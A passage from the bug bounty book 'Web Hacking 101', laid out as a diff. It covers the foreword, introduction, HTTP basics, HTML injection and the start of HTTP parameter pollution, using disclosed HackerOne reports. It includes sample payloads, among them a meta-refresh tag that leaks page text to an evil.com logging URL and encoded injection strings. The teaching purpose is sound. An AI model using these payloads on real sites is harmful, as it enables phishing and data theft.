@@ -1,0 +1,1736 @@
+CONTENTS
+
+23. Glossary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Black Hat Hacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Buffer Overflow . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Bug Bounty Program . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Bug Report . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+CRLF Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Cross Site Request Forgery . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Cross Site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+HTML Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+HTTP Parameter Pollution . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+HTTP Response Splitting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Memory Corruption . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Open Redirect . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Penetration Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Researchers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Response Team . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Responsible Disclosure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Vulnerability Coordination . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+Vulnerability Disclosure . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+White Hat Hacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+140
+140
+140
+140
+140
+140
+141
+141
+141
+141
+141
+141
+141
+142
+142
+142
+142
+142
+142
+143
+143
+
+1. Foreword
+The best way to learn is simply by doing. That is how we - Michiel Prins and Jobert Abma
+- learned to hack.
+We were young. Like all hackers who came before us, and all of those who will come
+after, we were driven by an uncontrollable, burning curiosity to understand how things
+worked. We were mostly playing computer games, and by age 12 we decided to learn
+how to build software of our own. We learned how to program in Visual Basic and PHP
+from library books and practice.
+From our understanding of software development, we quickly discovered that these skills
+allowed us to find other developers’ mistakes. We shifted from building to breaking and
+hacking has been our passion ever since. To celebrate our high school graduation, we
+took over a TV station’s broadcast channel to air an ad congratulating our graduating
+class. While amusing at the time, we quickly learned there are consequences and these
+are not the kind of hackers the world needs. The TV station and school were not amused
+and we spent the summer washing windows as our punishment. In college, we turned
+our skills into a viable consulting business that, at its peak, had clients in the public and
+private sector across the entire world. Our hacking experience led us to HackerOne, a
+company we co-founded in 2012. We wanted to allow every company in the universe to
+work with hackers successfully and this continues to be HackerOne’s mission today.
+If you’re reading this, you also have the curiosity needed to be a hacker and bug hunter.
+We believe this book will be a tremendous guide along your journey. It’s filled with rich,
+real world examples of security vulnerability reports that resulted in real bug bounties,
+along with helpful analysis and review by Pete Yaworski, the author and a fellow hacker.
+He is your companion as you learn, and that’s invaluable.
+Another reason this book is so important is that it focuses on how to become an ethical
+hacker. Mastering the art of hacking can be an extremely powerful skill that we hope
+will be used for good. The most successful hackers know how to navigate the thin line
+between right and wrong while hacking. Many people can break things, and even try to
+make a quick buck doing so. But imagine you can make the Internet safer, work with
+amazing companies around the world, and even get paid along the way. Your talent has
+the potential of keeping billions of people and their data secure. That is what we hope
+you aspire to.
+We are grateful to no end to Pete for taking his time to document all of this so eloquently.
+We wish we had this resource when we were getting started. Pete’s book is a joy to read
+with the information needed to kickstart your hacking journey.
+Happy reading, and happy hacking!
+1
+
+Foreword
+
+Remember to hack responsibly.
+Michiel Prins and Jobert Abma Co-Founders, HackerOne
+
+2
+
+2. Attention Hackers!
+When you read this book, we would absolutely LOVE to hear your comments on it.
+• Is it useful?
+• Is it well written?
+• Did you find anything to correct?
+• Is there anything missing?
+• Is there anything you want to see more of?
+• Is there anything you want to see less of?
+Send your comments to feedback@hackerone.com and mention the word “book” in
+the subject header.
+Thank you!
+P.S. And of course, if you indeed think this book is fantastic, feel free to tweet about that
+and recommend the book to your friends.
+
+3
+
+3. Introduction
+Thank you for downloading this book from HackerOne! You’re reading this because they
+believe in supporting and growing the community.
+Web Hacking 101 is my first book, meant to help you get started hacking. It’s an ongoing
+project which I continue to add content to and develop. I began writing it as a selfpublished explanation of 30 vulnerabilities, a by-product of my own learning. It quickly
+turned into so much more. My hope for the book, at the very least, is to open your eyes
+to the vast world of hacking. At best, I hope this will be your first step towards making
+the web a safer place while earning some money doing it.
+If you’re interested in continuing to learn with me, you can purchase the most recent
+version and receive updates for all future versions by visiting Web Hacking 101 on
+LeanPub1 . This book is also available in Russian on LeanPub.
+
+How It All Started
+In late 2015, I stumbled across the book, We Are Anonymous: Inside the Hacker World
+of LulzSec, Anonymous and the Global Cyber Insurgency by Parmy Olson and ended up
+reading it in a week. Having finished it though, I was left wondering how these hackers
+got started.
+I was thirsty for more, but I didn’t just want to know WHAT hackers did, I wanted to know
+HOW hackers did it. So I kept reading. But each time I finsihed a new book, I was still left
+with the same questions:
+• How do other Hackers learn about the vulnerabilities they find?
+• Where are people finding vulnerabilities?
+• How do Hackers start the process of hacking a target site?
+• Is Hacking just about using automated tools?
+• How can I get started finding vulnerabilities?
+But looking for more answers, kept opening more and more doors.
+Around this same time, I was taking Coursera Android development courses and keeping
+an eye out for other interesting courses. The Coursera Cybersecurity specialization
+caught my eye, particularly Course 2, Software Security. Luckily for me, it was just starting
+(as of February 2016, it is listed as Coming Soon) and I enrolled.
+1
+
+https://www.leanpub.com/web-hacking-101
+
+4
+
+Introduction
+
+5
+
+A few lectures in, I finally understood what a buffer overflow was and how it was
+exploited. I fully grasped how SQL injections were achieved whereas before, I only knew
+the danger. In short, I was hooked. Up until this point, I always approached web security
+from the developer’s perspective, appreciating the need to sanitize values and avoid
+using user input directly. Now I was beginning to understand what it all looked like from
+a hacker’s perspective.
+I kept looking for more information on how to hack and came across Bugcrowd’s forums.
+Unfortunately they weren’t overly active at the time but there someone mentioned
+HackerOne’s hacktivity and linked to a report. Following the link, I was amazed. I was
+reading a description of a vulnerability, written to a company, who then disclosed it to
+the world. Perhaps more importantly, the company actually paid the hacker to find and
+report this!
+That was a turning point, I became obsessed. Especially when a homegrown Canadian
+company, Shopify, seemed to be leading the pack in disclosures at the time. Checking
+out Shopify’s profile, their disclosure list was littered with open reports. I couldn’t read
+enough of them. The vulnerabilities included Cross-Site Scripting, Authentication and
+Cross-Site Request Forgery, just to name a few.
+Admittedly, at this stage, I was struggling to understand what the reports were detailing.
+Some of the vulnerabilities and methods of exploitation were hard to understand.
+Searching Google to try and understand one particular report, I ended on a GitHub issue
+thread for an old Ruby on Rails default weak parameter vulnerability (this is detailed in
+the Application Logic chapter) reported by Egor Homakov. Following up on Egor led me
+to his blog, which includes disclosures for some seriously complex vulnerabilities.
+Reading about his experiences, I realized, the world of hacking might benefit from plain
+language explanations of real world vulnerabilities. And it just so happened, that I learn
+better when teaching others.
+And so, Web Hacking 101 was born.
+
+Just 30 Examples and My First Sale
+I decided to start out with a simple goal, find and explain 30 web vulnerabilities in easy
+to understand, plain language.
+I figured, at worst, researching and writing about vulnerabilities would help me learn
+about hacking. At best, I’d sell a million copies, become a self-publishing guru and retire
+early. The latter has yet to happen and at times, the former seems endless.
+Around the 15 explained vulnerabilities mark, I decided to publish my draft so it could
+be purchased - the platform I chose, LeanPub (which most have probably purchased
+through), allows you to publish iteratively, providing customers with access to all
+
+Introduction
+
+6
+
+updates. I sent out a tweet thanking HackerOne and Shopify for their disclosures and
+to tell the world about my book. I didn’t expect much.
+But within hours, I made my first sale.
+Elated at the idea of someone actually paying for my book (something I created and was
+pouring a tonne of effort into!), I logged on to LeanPub to see what I could find out about
+the mystery buyer. Turns out nothing. But then my phone vibrated, I received a tweet
+from Michiel Prins saying he liked the book and asked to be kept in the loop.
+Who the hell is Michiel Prins? I checked his Twitter profile and turns out, he’s one
+of the Co-Founders of HackerOne. Shit. Part of me thought HackerOne wouldn’t be
+impressed with my reliance on their site for content. I tried to stay positive, Michiel
+seemed supportive and did ask to be kept in the loop, so probably harmless.
+Not long after my first sale, I received a second sale and figured I was on to something.
+Coincidentally, around the same time, I got a notification from Quora about a question
+I’d probably be interested in, How do I become a successful Bug bounty hunter?
+Given my experience starting out, knowing what it was like to be in the same shoes
+and with the selfish goal of wanting to promote my book, I figured I’d write an answer.
+About half way through, it dawned on me that the only other answer was written by
+Jobert Abma, one of the other Co-Founders of HackerOne. A pretty authoritative voice
+on hacking. Shit.
+I contemplated abandoning my answer but then elected to rewrite it to build on his input
+since I couldn’t compete with his advice. I hit submit and thought nothing of it. But then
+I received an interesting email:
+Hi Peter, I saw your Quora answer and then saw that you are writing a book
+about White Hat hacking. Would love to know more.
+Kind regards,
+Marten CEO, HackerOne
+Triple Shit. A lot of things ran through my mind at this point, none of which were positive
+and pretty much all were irrational. In short, I figured the only reason Marten would
+email me was to drop the hammer on my book. Thankfully, that couldn’t have been
+further from the truth.
+I replied to him explaining who I was and what I was doing - that I was trying to learn
+how to hack and help others learn along with me. Turns out, he was a big fan of the idea.
+He explained that HackerOne is interested in growing the community and supporting
+hackers as they learn as it’s mutually beneficial to everyone involved. In short, he offered
+to help. And man, has he ever. This book probably wouldn’t be where it is today or include
+half the content without his and HackerOne’s constant support and motivation.
+
+Introduction
+
+7
+
+Since that initial email, I kept writing and Marten kept checking in. Michiel and Jobert
+reviewed drafts, provided suggestions and even contributed some sections. Marten even
+went above and beyond to cover the costs of a professionally designed cover (goodbye
+plain yellow cover with a white witches’ hat, all of which looked like it was designed by a
+four year old). In May 2016, Adam Bacchus joined HackerOne and on his 5th day working
+there, he read the book, provided edits and was explaining what it was like to be on the
+receiving end of vulnerability reports - something I’ve now included in the report writing
+chapter.
+I mention all this because throughout this journey, HackerOne has never asked for
+anything in return. They’ve just wanted to support the community and saw this book
+was a good way of doing it. As someone new to the hacking community, that resonated
+with me and I hope it does with you too. I personally prefer to be part of a supportive
+and inclusive community.
+So, since then, this book has expanded dramatically, well beyond what I initially envisioned. And with that, the target audience has also changed.
+
+Who This Book Is Written For
+This book is written with new hackers in mind. It doesn’t matter if you’re a web developer,
+web designer, stay at home mom, a 10 year old or a 75 year old. I want this book to be an
+authoritative reference for understanding the different types of vulnerabilities, how to
+find them, how to report them, how to get paid and even, how to write defensive code.
+That said, I didn’t write this book to preach to the masses. This is really a book
+about learning together. As such, I share successes AND some of my notable (and
+embarrassing) failures.
+The book also isn’t meant to be read cover to cover, if there is a particular section you’re
+interested in, go read it first. In some cases, I do reference sections previously discussed,
+but doing so, I try to connect the sections so you can flip back and forth. I want this book
+to be something you keep open while you hack.
+On that note, each vulnerability type chapter is structured the same way:
+• Begin with a description of the vulnerability type;
+• Review examples of the vulnerability; and,
+• Conclude with a summary.
+Similarly, each example within those chapters is structured the same way and includes:
+• My estimation of the difficulty finding the vulnerability
+• The url associated with where the vulnerability was found
+
+Introduction
+
+8
+
+• A link to the report or write up
+• The date the vulnerability was reported
+• The amount paid for the report
+• An easy to understand description of the vulnerability
+• Take aways that you can apply to your own efforts
+Lastly, while it’s not a prerequisite for hacking, it is probably a good idea to have some
+familiarity with HTML, CSS, Javascript and maybe some programming. That isn’t to say
+you need to be able to put together web pages from scratch, off the top of your head
+but understanding the basic structure of a web page, how CSS defines a look and feel
+and what can be accomplished with Javascript will help you uncover vulnerabilities and
+understand the severity of doing so. Programming knowledge is helpful when you’re
+looking for application logic vulnerabilities. If you can put yourself in the programmer’s
+shoes to guess how they may have implemented something or read their code if it’s
+available, you’ll be ahead in the game.
+To do so, I recommend checking out Udacity’s free online courses Intro to HTML and
+CSS and Javacript Basics, links to which I’ve included in the Resources chapter. If you’re
+not familiar with Udacity, it’s mission is to bring accessible, affordable, engaging and
+highly effective higher education to the world. They’ve partnered with companies like
+Google, AT&T, Facebook, Salesforce, etc. to create programs and offer courses online.
+
+Chapter Overview
+Chapter 2 is an introductory background to how the internet works, including HTTP
+requests and responses and HTTP methods.
+Chapter 3 covers HTML Injections and in it, you’ll learn how being able to inject HTML
+into a web page can be used maliciously. One of the more interesting takeaways is how
+you can use encoded values to trick sites into accepting and rendering the HTML you
+submit, bypassing filters.
+Chapter 4 covers HTTP Parameter Pollution and in it, you’‘ll learn how to find systems
+that may be vulnerable to passing along unsafe input to third party sites.
+Chapter 5 covers Carriage Return Line Feed Injections and in it, looking at examples of
+submitting carriage return, line breaks to sites and the impact it has on rendered content.
+Chapter 6 covers Cross-Site Request Forgery vulnerabilities, walking through examples
+that show how users can be tricked into submitting information to a website they are
+logged into unknowingly.
+Chapter 7 covers application logic based vulnerabilities. This chapter has grown into a
+catch all for vulnerabilities I consider linked to programming logic flaws. I’ve found these
+types of vulnerabilities may be easier for a beginner to find instead of looking for weird
+and creative ways to submit malicious input to a site.
+
+Introduction
+
+9
+
+Chapter 8 covers Cross-Site Scripting, a massive topic with a huge variety of ways to
+achieve exploits. Cross-Site Scripting represents huge opportunities and an entire book
+could and probably should, be written solely on it. There are a tonne of examples I could
+have included here so I try to focus on the most interesting and helpful for learning.
+Chapter 9 covers structured query language (SQL) injections, which involve manipulating
+database queries to extract, update or delete information from a site.
+Chapter 10 covers Open Redirects, an interesting vulnerability which involves exploiting
+a site to direct users to visit another site.
+Chapter 11 covers Sub Domain Takeovers, something I learned a lot about researching
+this book. Essentially here, a site refers to a sub domain hosting with a third party service
+but never actually claims the appropriate address from that service. This would allow an
+attacker to register the address from the third party so that all traffic, which believes it
+is on the victim’s domain, is actually on an attacker’s.
+Chapter 12 covers XML External Entity vulnerabilities resulting from a sites parsing of
+extensible markup language (XML). These types of vulnerabilities can include things like
+reading private files, remote code execution, etc.
+Chapter 13 covers Remote Code Execution, or the ability for an attacker to trigger
+arbitrary code on a victim server.
+Chapter 14 covers Template Injections, looking at Server and Client side examples. In
+doing so, template engines are explained as well as how they impact the severity of this
+vulnerability type.
+Chapter 15 covers Server Side Request Forgery which allows an attacker to user a remote
+server to make subsequent HTTP requests on the attacker’s behalf.
+Chapter 16 covers memory related vulnerabilities, a type of vulnerability which can be
+tough to find and are typically related to low level programming languages. However,
+discovering these types of bugs can lead to some pretty serious vulnerabilities.
+Chapter 17 covers the topic of how to get started. This chapter is meant to help you
+consider where and how to look for vulnerabilities as opposed to a step by step guide to
+hacking a site.
+Chapter 18 is arguably one of the most important book chapters as it provides advice
+on how to write an effective report. All the hacking in the world means nothing if you
+can’t properly report the issue to the necessary company. As such, I scoured some big
+name bounty paying companies for their advice on how best to report and got advice
+from HackerOne. Make sure to pay close attention here.
+Chapter 19 switches gears. Here we dive into recommended hacking tools. This chapter
+was largely donated by Michiel Prins from HackerOne and describes a tonne of interesting tools which make your life easier! However, despite all the tools, nothing replaces
+creative thinking and observation.
+
+Introduction
+
+10
+
+Chapter 20 is dedicated to helping you take your hacking to the next level. Here I walk
+you through some awesome resources for continuing to learn. Again, at the risk of
+sounding like a broken record, big thanks to Michiel Prins for contributing to this list.
+Chapter 21 concludes the book and covers off some key terms you should know while
+hacking. While most are discussed in other chapters, some aren’t so I’d recommend
+taking a read here.
+
+Word of Warning and a Favour
+Before you set off into the amazing world of hacking, I want to clarify something. As I
+was learning, reading about public disclosures, seeing all the money people were (and
+still are) making, it became easy to glamorize the process and think of it as an easy way
+to get rich quick.
+It isn’t.
+Hacking can be extremely rewarding but it’s hard to find and read about the failures
+along the way (except here where I share some pretty embarrassing stories). As a result,
+since you’ll mostly hear of peoples’ successes, you may develop unrealistic expectations
+of success. And maybe you will be quickly successful. But if you aren’t, keep working! It
+will get easier and it’s a great feeling to have a report resolved.
+With that, I have a favour to ask. As you read, please message me on Twitter @yaworsk or
+email me peter@torontowebsitedeveloper.com and let me know how it’s going. Whether
+successful or unsuccessful, I’d like to hear from you. Bug hunting can be lonely work if
+you’re struggling but its also awesome to celebrate with each other. And maybe your find
+will be something we can include in the next edition.
+Good luck!!
+
+4. Background
+If you’re starting out fresh like I was and this book is among your first steps into the world
+of hacking, it’s going to be important for you to understand how the internet works.
+Before you turn the page, what I mean is how the URL you type in the address bar is
+mapped to a domain, which is resolved to an IP address, etc.
+To frame it in a sentence: the internet is a bunch of systems that are connected and
+sending messages to each other. Some only accept certain types of messages, some only
+allow messages from a limited set of other systems, but every system on the internet
+receives an address so that people can send messages to it. It’s then up to each system
+to determine what to do with the message and how it wants to respond.
+To define the structure of these messages, people have documented how some of these
+systems should communicate in Requests for Comments (RFC). As an example, take a
+look at HTTP. HTTP defines the protocol of how your internet browser communicates
+with a web server. Because your internet browser and web server agreed to implement
+the same protocol, they are able to communicate.
+When you enter http://www.google.com in your browser’s address bar and press return,
+the following steps describe what happens on a high level:
+• Your browser extracts the domain name from the URL, www.google.com.
+• Your computer sends a DNS request to your computer’s configured DNS servers.
+DNS can help resolve a domain name to an IP address, in this case it resolves to
+216.58.201.228. Tip: you can use dig A www.google.com from your terminal to look
+up IP addresses for a domain.
+• Your computer tries to set up a TCP connection with the IP address on port 80,
+which is used for HTTP traffic. Tip: you can set up a TCP connection by running nc
+216.58.201.228 80 from your terminal.
+• It it succeeds, your browser will send an HTTP request like:
+
+GET / HTTP/1.1
+Host: www.google.com
+Connection: keep-alive
+Accept: application/html, */*
+
+• Now it will wait for a response from the server, which will look something like:
+
+11
+
+Background
+
+12
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+<html>
+<head>
+<title>Google.com</title>
+</head>
+<body>
+...
+</body>
+</html>
+
+• Your browser will parse and render the returned HTML, CSS, and JavaScript. In this
+case, the home page of Google.com will be shown on your screen.
+Now, when dealing specifically with the browser, the internet and HTML, as mentioned
+previously, there is an agreement on how these messages will be sent, including the
+specific methods used and the requirement for a Host request-header for all HTTP/1.1
+requests, as noted above in bullet 4. The methods defined include GET, HEAD, POST, PUT,
+DELETE, TRACE, CONNECT and OPTIONS.
+The GET method means to retrieve whatever information is identified by the request
+Uniform Request Identifier (URI). The term URI may be confusing, especially given the
+reference to a URL above, but essentially, for the purposes of this book, just know that
+a URL is like a person’s address and is a type of URI which is like a person’s name
+(thanks Wikipedia). While there are no HTTP police, typically GET requests should not be
+associated with any data altering functions, they should just retrieve and provide data.
+The HEAD method is identical to the GET message except the server must not return a
+message body in the response. Typically you won’t often see this used but apparently it is
+often employed for testing hypertext links for validity, accessibility and recent changes.
+The POST method is used to invoke some function to be performed by the server, as
+determined by the server. In other words, typically there will be some type of back end
+action performed like creating a comment, registering a user, deleting an account, etc.
+The action performed by the server in response to the POST can vary and doesn’t have
+to result in action being taken. For example, if an error occurs processing the request.
+The PUT method is used when invoking some function but referring to an already existing
+entity. For example, when updating your account, updating a blog post, etc. Again, the
+action performed can vary and may result in the server taking no action at all.
+The DELETE method is just as it sounds, it is used to invoke a request for the remote
+server to delete a resource identified by the URI.
+
+Background
+
+13
+
+The TRACE method is another uncommon method, this time used to reflect back the
+request message to the requester. This allows the requester to see what is being received
+by the server and to use that information for testing and diagnostic information.
+The CONNECT method is actually reserved for use with a proxy (a proxy is a basically a
+server which forwards requests to other servers)
+The OPTIONS method is used to request information from a server about the communication options available. For example, calling for OPTIONS may indicate that the server
+accepts GET, POST, PUT, DELETE and OPTIONS calls but not HEAD or TRACE.
+Now, armed with a basic understanding of how the internet works, we can dive into the
+different types of vulnerabilities that can be found in it.
+
+5. HTML Injection
+Description
+Hypertext Markup Language (HTML) injection is also sometimes referred to as virtual
+defacement. This is really an attack made possible by a site allowing a malicious user
+to inject HTML into its web page(s) by not handling that user’s input properly. In other
+words, an HTML injection vulnerability is caused by receiving HTML, typically via some
+form input, which is then rendered as is on the page. This is separate and distinct from
+injecting Javascript, VBscript etc.
+Since HTML is the language used to define the structure of a web page, if an attacker
+can inject HTML, they can essentially change what a browser renders. Sometimes this
+could result in completely changing the look of a page or in other cases, creating forms
+to trick users. For example, if you could inject HTML, you might be able to add a <form> tag
+to the page, asking the user to re-enter their username and password. However, when
+submitting this form, it actually sends the information to an attacker.
+
+Examples
+1. Coinbase Comments
+Difficulty: Low
+Url: coinbase.com/apps
+Report Link: https://hackerone.com/reports/1045431
+Date Reported: December 10, 2015
+Bounty Paid: $200
+Description:
+For this vulnerability, the reporter identified that Coinbase was actually decoding URI
+encoded values when rendering text. For those unfamiliar (I was at the time of writing
+this), characters in a URI are either reserved or unreserved. According to Wikipedia,
+reserved are characters that sometimes have special meaning like / and &. Unreserved
+characters are those without any special meaning, typically just letters.
+1
+
+https://hackerone.com/reports/104543
+
+14
+
+HTML Injection
+
+15
+
+So, when a character is URI encoded, it is converted into its byte value in the American
+Standard Code for Information Interchange (ASCII) and preceded with a percent sign
+(%). So, / becomes %2F, & becomes %26. As an aside, ASCII is a type of encoding which
+was most common on the internet until UTF-8 came along, another encoding type.
+Now, back to our example, if an attacker entered HTML like:
+<h1>This is a test</h1>
+
+Coinbase would actually render that as plain text, exactly as you see above. However, if
+the user submitted URL encoded characters, like:
+%3C%68%31%3E%54%68%69%73%20%69%73%20%61%20%74%65%73%74%3C%2F%68%31%3E
+
+Coinbase would actually decode that string and render the corresponding letters, or:
+This is a test
+With this, the reporting hacker demonstrated how he could submit an HTML form with
+username and password fields, which Coinbase would render. Had the hacker been
+malicious, Coinbase could have rendered a form which submitted values back to a
+malicious website to capture credentials (assuming people filled out and submitted the
+form).
+Takeaways
+When you’re testing out a site, check to see how it handles different types of
+input, including plain text and encoded text. Be on the lookout for sites that are
+accepting URI encoded values like %2F and rendering their decoded values, in
+this case /. While we don’t know what the hacker was thinking in this example,
+it’s possible they tried to URI encode restricted characters and noticed that
+Coinbase was decoding them. They then went one step further and URI encoded
+all characters.
+A great URL Encoder is http://quick-encoder.com/url. You’ll notice using it that
+it will tell you unrestricted characters do not need encoding and give you the
+option to encode url-safe characters anyway. That’s how you would get the same
+encoded string used on Coinbase.
+
+HTML Injection
+
+16
+
+2. HackerOne Unintended HTML Inclusion
+Difficulty: Medium
+Url: hackerone.com
+Report Link: https://hackerone.com/reports/1129352
+Date Reported: January 26, 2016
+Bounty Paid: $500
+Description:
+After reading about the Yahoo! XSS (example 4 in Chapter 7) I became obsessed
+with testing HTML rendering in text editors. This included playing with HackerOne’s
+Markdown editor, entering things like ismap= “yyy=xxx” and “‘test” inside of image
+tags. While doing so, I noticed that the editor would include a single quote within a double
+quote - what is known as a hanging quote.
+At that time, I didn’t really understand the implications of this. I knew that if you injected
+another single quote somewhere, the two could be parsed together by a browser which
+would see all content between them as one HTML element. For example:
+<h1>This is a test</h1><p class="some class">some content</p>'
+
+With this example, if you managed to inject a meta tag like:
+<meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
+
+the browser would submit everything between the two single quotes. Now, turns out, this
+was known and disclosed in HackerOne report #1105783 by intidc (https://hackerone.com/intidc).
+When that became public, my heart sank a little.
+According to HackerOne, they rely on an implementation of Redcarpet (a Ruby library for
+Markdown processing) to escape the HTML output of any Markdown input which is then
+passed directly into the HTML DOM (i.e., the web page) via dangerouslySetInnerHTML
+in their React component. As an aside, React is a Javascript library that can be used to
+dynamically update a web page’s content without reloading the page.
+The DOM refers to an application program interface for valid HTML and well-formed
+XML documents. Essentially, according to Wikipedia, the DOM is a cross-platform and
+language independent convention for representing and interacting with objects in HTML,
+XHTML and XML documents.
+In HackerOne’s implementation, they weren’t properly escaping the HTML output which
+led to the potential exploit. Now, that said, seeing the disclosure, I thought I’d test out
+the new code. I went back and tested out adding:
+2
+3
+
+https://hackerone.com/reports/112935
+https://hackerone.com/reports/110578
+
+HTML Injection
+
+17
+
+[test](http://www.torontowebsitedeveloper.com "test ismap="alert xss" yyy="test"\
+")
+
+which got turned into:
+<a title="'test" ismap="alert xss" yyy="test" &#39; ref="http://www.toronotwebsi\
+tedeveloper.com">test</a>
+
+As you can see, I was able to inject a bunch of HTML into the <a> tag. As a result,
+HackerOne rolled back the fix and began working on escaping single quote again.
+Takeaways
+Just because code is updated, doesn’t mean something is fixed. Test things out.
+When a change is deployed, that also means new code which could contain bugs.
+Additionally, if you feel like something isn’t right, keep digging! I knew the initial
+trailing single quote could be a problem, but I didn’t know how to exploit it and
+I stopped. I should have kept going. I actually learned about the meta refresh
+exploit by reading XSS Jigsaw’s blog.innerht.ml (it’s included in the Resources
+chapter) but much later.
+
+3. Within Security Content Spoofing
+Difficulty: Low
+Url: withinsecurity.com/wp-login.php
+Report Link: https://hackerone.com/reports/1110944
+Date Reported: January 16, 2015
+Bounty Paid: $250
+Description:
+Though content spoofing is technically a different type of vulnerability than HTML
+injection, I’ve included it here as it shares the similar nature of an attacker having a site
+rendered content of their choosing.
+Within Security was built on the Wordpress platform which includes the login path
+withinsecurity.com/wp-login.php (the site has since been merged with the HackerOne
+core platform). A hacker noticed that during the login process, if an error occurred,
+Within Security would render access_denied, which also corresponded to the error
+parameter in the url:
+4
+
+https://hackerone.com/reports/111094
+
+18
+
+HTML Injection
+
+https://withinsecurity.com/wp-login.php?error=access_denied
+
+Noticing this, the hacker tried modifying the error parameter and found that whatever
+value was passed was rendered by the site as part of the error message presented to
+users. Here’s the example used:
+https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20%hacked
+
+WithinSecurity Content Spoofing
+
+The key here was noticing the parameter in the URL being rendered on the page. Though
+they don’t explain, I would assume the hacker noticed that access_denied was being
+displayed on the page but was also included in the URL. A simple test changing the
+access_denied parameter probably revealed the vulnerability in this case, which they
+reported.
+Takeaways
+Keep an eye on URL parameters which are being passed and rendered as
+site content. They may present opportunities for attackers to trick victims into
+performing some malicious action.
+
+HTML Injection
+
+19
+
+Summary
+HTML Injection presents a vulnerability for sites and developers because it can be used
+to mislead users and trick them into submitting sensitive information to, or visiting,
+malicious websites. Otherwise known as phishing attacks.
+Discovering these vulnerabilities isn’t always about submitting plain HTML but exploring
+how a site might render your inputted text, like URI encoded characters. And while not
+entirely the same as HTML injection, content spoofing is similar in that it involves having
+some input reflected back to a victim in the HTML page. Hackers should be on the lookout
+for the opportunity to manipulate URL parameters and have them rendered on the site.
+
+6. HTTP Parameter Pollution
+Description
+HTTP Parameter Pollution, or HPP, occurs when a website accepts input from a user and
+uses it to make an HTTP request to another system without validating that user’s input.
+This can happen one of two ways, via the server (or back end) and via the client side.
+On StackExchange, SilverlightFox provides a great example of a HPP server side attack;
+suppose we have the following website, https://www.example.com/transferMoney.php,
+which is accessible via a POST method taking the following parameters:
+amount=1000&fromAccount=12345
+When the application processes this request, it makes its own POST request to another
+back end system, which in turn actually processes the transaction with a fixed toAccount
+parameter.
+Separate back end URL: https://backend.example/doTransfer.php
+Separate back end Parameters: toAccount=9876&amount=1000&fromAccount=12345
+Now, if the back end only takes the last parameter when duplicates are provided and
+suppose a hacker alters the POST to the website to submit a toAccount param like this:
+amount=1000&fromAccount=12345&toAccount=99999
+A site vulnerable to an HPP attack would forward the request to the other back end
+system looking like:
+toAccount=9876&amount=1000&fromAccount=12345&toAccount=99999
+In this case, the second toAccount parameter submitted by the malicious user could
+override the back end request and transfer the money into the malicious user’s submitted account (99999) instead of the intended account set by the system (9876).
+This is useful if an attacker were to amend their own requests, which are processed
+through a vulnerable system. But it can be also more useful to an attacker if that attacker
+can generate a link from another website and entice users to unknowingly submit the
+malicious request with the extra parameter added by the attacker.
+On the other hand, HPP client side involves injecting additional parameters to links and
+other src attributes. Borrowing an example from OWASP, suppose we had the following
+code:
+20
+
+HTTP Parameter Pollution
+
+21
+
+<? $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?>
+<a href="/page.php?action=view&par='.<?=$val?>.'">View Me!</a>
+
+This takes a value for par from the URL, makes sure it’s safe and creates a link out of it.
+Now, if an attacker submitted:
+http://host/page.php?par=123%26action=edit
+
+the resulting link would look like:
+<a href="/page.php?action=view&par=123&amp;action=edit">View Me!</a>
+
+This could lead to the application then accepting the edit action instead of the view action.
+Both HPP server side and client side depend on which back end technology is being
+used and how it behaves when receiving multiple parameters with the same name. For
+example, PHP/Apache uses the last occurrence, Apache Tomcat uses the first occurrence,
+ASP/IIS uses all occurrences, etc. As a result, there is no single guaranteed handling for
+submitting multiple parameters with the same name and finding HPP will take some
+experimentation to confirm how the site you’re testing works.
+
+Examples
+1. HackerOne Social Sharing Buttons
+Difficulty: Low
+Url: https://hackerone.com/blog/introducing-signal-and-impact
+Report Link: https://hackerone.com/reports/1059531
+Date Reported: December 18, 2015
+Bounty Paid: $500
+Description: HackerOne includes links to share content on popular social media sites
+like Twitter, Facebook, etc. These social media links include specific parameters for the
+social media link.
+A vulnerability was discovered where a hacker could tack on another URL parameter
+to the link and have it point to any website of their choosing, which HackerOne would
+include in the POST to the social media site, thereby resulting in unintended behaviour.
+The example used in the vulnerability report was changing the URL:
+https://hackerone.com/blog/introducing-signal
+
+to
+1
+
+https://hackerone.com/reports/105953
+
+HTTP Parameter Pollution
+
+22
+
+https://hackerone.com/blog/introducing-signal?&u=https://vk.com/durov
+
+Notice the added u parameter. If the maliciously updated link was clicked on by
+HackerOne visitors trying to share content via the social media links, the malicious link
+would look like:
+https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&u=https://vk.com/durov
+
+Here, the last u parameter was given precedence over the first and subsquently used
+in the Facebook post. When posting to Twitter, the suggested default text could also be
+changed:
+https://hackerone.com/blog/introducing-signal?&u=https://vk.com/durov&text=another_site:https://vk.com/durov
+
+Takeaways
+Be on the lookout for opportunities when websites are accepting content and
+appear to be contacting another web service, like social media sites.
+In these situations, it may be possible that submitted content is being passed on
+without undergoing the proper security checks.
+
+2. Twitter Unsubscribe Notifications
+Difficulty: Low
+Url: twitter.com
